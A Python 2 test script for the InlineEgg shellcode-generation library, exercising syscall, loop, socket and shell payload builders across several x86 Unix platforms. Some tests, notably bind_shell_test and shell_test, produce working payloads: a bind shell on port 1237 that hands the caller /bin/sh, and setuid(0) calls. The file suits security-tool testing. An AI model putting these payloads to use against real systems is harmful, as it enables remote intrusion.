#!/usr/bin/python 
#--
# Copyright (c) 2002,2003 Core Security Technologies, Core SDI Inc.
# All rights reserved.
#
#    Unless you have express writen permission from the Copyright Holder, any
# use of or distribution of this software or portions of it, including, but not
# limited to, reimplementations, modifications and derived work of it, in
# either source code or any other form, as well as any other software using or
# referencing it in any way, may NOT be sold for commercial gain, must be
# covered by this very same license, and must retain this copyright notice and
# this license.
#    Neither the name of the Copyright Holder nor the names of its contributors
# may be used to endorse or promote products derived from this software
# without specific prior written permission.
#
# THERE IS NO WARRANTY FOR THE SOFTWARE, TO THE EXTENT PERMITTED BY APPLICABLE
# LAW. EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR
# OTHER PARTIES PROVIDE THE SOFTWARE "AS IS" WITHOUT WARRANTY OF ANY KIND,
# EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE
# ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU.
# SHOULD THE SOFTWARE PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY
# SERVICING, REPAIR OR CORRECTION.
#
# IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL
# ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR REDISTRIBUTE
# THE SOFTWARE AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
# GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE
# OR INABILITY TO USE THE SOFTWARE (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR
# DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR
# A FAILURE OF THE SOFTWARE TO OPERATE WITH ANY OTHER SOFTWARE), EVEN IF SUCH
# HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
#
# gera [at corest.com]
#--
# $Id: inlineegg_test.py,v 1.3 2004/06/16 14:32:58 gera Exp $

from inlineegg import *
import sys

class Syscall_test:
    def __init__(self, osClass, filename):
        egg = InlineEgg(osClass)
        self.buildEgg(egg)
        egg.dumpElf(filename+'.elf')
        egg.dumpAOut(filename+'.a.out')
        egg.dumpS(filename+'.S')

    def buildEgg(self, egg):
        egg.setuid(0)
        egg.mkdir('hola loco')
        egg.exit(0)

class Microx86_test(Syscall_test):
    def test_op2(self, op):
        code = ''
        for reg1 in self.micro.registers():
            for reg2 in self.micro.registers():
                code += op(reg1, reg2)
        self.egg += code


    def test_op1(self, op, other = None, reset = 1):
       code = ''
       for reg in self.micro.registers():
          if reset: self.micro.reset()
          if other == None: code += op(reg)
          else: code += op(reg, other)
       self.egg += code

    def buildEgg(self, egg):
        m = egg.micro

        self.micro = m
        self.egg = egg
        
        egg += '\xcc'

        self.test_op1(m.set, 0)
        self.test_op1(m.set, 1)
        self.test_op1(m.set, 0x1234)

        for reg in m.registers():
            m.reset()
            egg += m.set(reg, 0x87654321)
            egg += m.set(reg, 0x87651234)
            egg += m.set(reg, 0x876512AA)

        self.test_op1(m.set, Variable(4))
        self.test_op1(m.set, Variable(-4))
        self.test_op1(m.set, Variable(0x80))
        self.test_op1(m.set, Variable(-0x80))
        self.test_op1(m.set, 'hola loco')
        # self.test_op1(m.set, ('hola','manola','te traje','una lola',0))

        self.test_op1(m.inc)
        self.test_op1(m.dec)
        self.test_op1(m.push)
        self.test_op1(m.pop)

        self.test_op2(m.set)
        self.test_op2(m.cmp)

        self.test_op1(m.subValue,0x7f)
        self.test_op1(m.subValue,-0x80)
        self.test_op1(m.subValue,0x12345678)
        # self.test_op1(m.subValue,Variable(-10))
        # self.test_op1(m.subValue,Variable(-1000))

        self.test_op1(m.addValue,0x7f)
        self.test_op1(m.addValue,-0x80)
        self.test_op1(m.addValue,0x12345678)
        # self.test_op1(m.addValue,Variable(-10))
        # self.test_op1(m.addValue,Variable(-1000))

        a = ''
        a += m.inc(Variable(4))
        a += m.inc(Variable(0x80))
        a += m.dec(Variable(-4))
        a += m.dec(Variable(-0x80))
        a += m.cmp(Variable(4), 1)
        a += m.cmp(Variable(-4), 1)
        a += m.cmp(Variable(4), 0x1234)
        a += m.cmp(Variable(-4), 0x1234)
        a += m.cmp(Variable(0x1234), 1)
        a += m.cmp(Variable(-0x1234), 1)
        a += m.cmp(Variable(0x1234), 0x1234)
        a += m.cmp(Variable(-0x1234), 0x1234)

        egg += a

class While1_test(Syscall_test):
    def buildEgg(self, egg):
        egg.setuid(0)
        w1 = egg.While1()
        w1.mkdir('hola loco')
        w1.end()
        egg.setuid(1)

class While_test(Syscall_test):
    def buildEgg(self, egg):
        egg.setuid(0)
        w1 = egg.While('eax','=','ebx')
        w1.mkdir('hola loco')
        w1.end()
        egg.setuid(1)

class Function_test(Syscall_test):
    def buildEgg(self, egg):
        egg.setuid(0)
        f = egg.Function()
        f.mkdir('hola loco')
        f.end()
        egg.setuid(1)
        egg.call(f)
        egg.setuid(2)

class cat_test(Syscall_test):
    def buildEgg(self, egg):
        fd = egg.open(Variable(-8),0,0)
        fd = egg.save(fd)
        buf = egg.alloc(200)

        d = egg.Do()
        read = d.read(fd,buf.addr(),200)
        d.write(1,buf.addr(),read)
        d.While('eax','!=',0)

        egg.exit(0)

class connect_test(Syscall_test):
    def buildEgg(self, egg):
        import socket
        sock = egg.socket(socket.AF_INET,socket.SOCK_STREAM,0)
        sock = egg.save(sock)
        egg.connect(sock, ('127.0.0.1',1028))
        egg.write(sock,"Hola my friend!\n",len("Hola my friend!\n"))
        egg.close(sock)
        egg.exit(0)
        return egg

class echo_server_test(Syscall_test):
    def buildEgg(self, egg):
        import socket
        sock = egg.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock = egg.save(sock)
        egg.bind(sock, ('127.0.0.1',7))
        egg.listen(sock,1)

        sa = egg.alloc(16)
        salen = egg.save(16)
        client = egg.accept(sock, sa.addr(), salen.addr())
        client = egg.save(client)
        egg.close(sock)

        buf = egg.alloc(100)

        w = egg.Do()
        read = egg.read(client, buf.addr(), 100)
        writen = egg.write(client, buf.addr(), read)
        w.While(writen, '!=', 0)

        egg.close(client)
        egg.exit(0)
        return egg

class shell_test(Syscall_test):
    def buildEgg(self, egg):
        egg.execve('/bin/sh',('sh','-i'), ("TEST1=test1","TEST2","TEST3=test3"))
        return egg

class bind_shell_test(Syscall_test):
    def buildEgg(self, egg):
        import socket
        sock = egg.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock = egg.save(sock)
        egg.bind(sock, ('0.0.0.0',1237))
        egg.listen(sock,1)

        sa = egg.alloc(16)
        salen = egg.save(16)
        client = egg.accept(sock, sa.addr(), salen.addr())
        client = egg.save(client)
        egg.close(sock)

        egg.dup2(client, 0)
        egg.dup2(client, 1)
        egg.dup2(client, 2)
        egg.execve('/bin/sh',('sh','-i'))
        return egg

class if_eq_test(Syscall_test):
    def buildEgg(self, egg):

        egg.setuid(0)
        f = egg.If('eax','=','ebx')
        f.mkdir('hola loco')
        f.end()
        egg.setuid(1)
        egg.setuid(2)

class plt_hook_test(Syscall_test):
    def buildEgg(self, hook):
        fd = 5

        hook.setBaseAddr(0x8048074)
        ___if = hook.If(Variable(-4),'=',fd)
        ___if.write(fd, Variable(-8), Variable(-12))
#        print "before end: "
#        print "if..stack: %s" % ___if.micro.stack
#        print "hook..stack: %s" % hook.micro.stack
        ___if.end()
#        print "after end: "
#        print "if..stack: %s" % ___if.micro.stack
#        print "hook..stack: %s" % hook.micro.stack
        hook.freeStack()
#        print "after freeStack: "
#        print "if..stack: %s" % ___if.micro.stack
#        print "hook..stack: %s" % hook.micro.stack
        hook.jump(0x12345678) 

        raise Exception, "must implement arguments"

        hook.save(Variable(-12))
        hook.save(Variable(-12))
        hook.save(Variable(-12))
        hook.call(0x12345678)
        # hook.saveRegisters()
        ___if = hook.If(Variable(-4),'=',fd)
        ___if.write(fd,Variable(-8),'eax')
        ___if.end()
        # hook.restoreRegister()
        hook.ret()


tests = {
   "micro":Microx86_test,
   "syscall": Syscall_test,
   "wl": While1_test,
   "weq": While_test,
   "f": Function_test,
   "cat": cat_test,
   "ifeq": if_eq_test,
#   "plt": plt_hook_test,
   "shell": shell_test,
   "listen": echo_server_test,
   "connect": connect_test,
   "bind_shell": bind_shell_test,
}

all_plats = {
   'linux':Linuxx86Syscall,
   'obsd':OpenBSDx86Syscall,
   'free':FreeBSDx86Syscall,
   'solaris':Solarisx86Syscall,
}

to_do = []
plats = []

if len(sys.argv) > 1:
   for test in sys.argv[1:]:
      if test == '-a':
         to_do = tests.values()
         plats = all_plats.values()
         break
      if test[0] == '-':
         plat = test[1:]
         plats.append(all_plats[plat])
      else:
         to_do.append(tests[test])
else:
   print "Use: %s [-a]" % sys.argv[0],
   for i in all_plats.keys():
      print "[-%s]" % i,
   for i in tests.keys():
      print "[%s]" % i,
   print
   sys.exit(1)

if not plats: plats = all_plats.values()
if not to_do: to_do = tests.values()

print "Tests to do: %s" % map(lambda x:x.__name__,to_do)
print "Platforms to test: %s" % map(lambda x:x.__name__,plats)

for plat in plats:
   for test in to_do:
      print "Platform: %s Test: %s" % (plat.__name__,test.__name__)
      test(plat, "%s_%s" % (plat.__name__,test.__name__))
